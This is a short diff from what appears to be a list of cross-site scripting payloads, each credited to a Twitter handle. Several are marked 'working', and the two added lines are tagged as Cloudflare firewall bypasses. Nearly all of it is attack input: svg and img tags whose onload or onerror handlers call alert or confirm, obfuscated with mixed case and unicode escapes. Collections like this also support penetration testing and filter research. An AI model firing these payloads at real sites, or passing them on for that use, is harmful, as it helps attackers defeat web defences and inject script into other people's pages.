@@ -24,3 +24,5 @@ test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
 <svg on onload=(alert)(document.domain)> -@zapstiko
 <svg/on%20onload=alert(1)> (working) -@aufzayed
 <img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=alert(1)>  --> cloudflare
+<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1// --> cloudflare
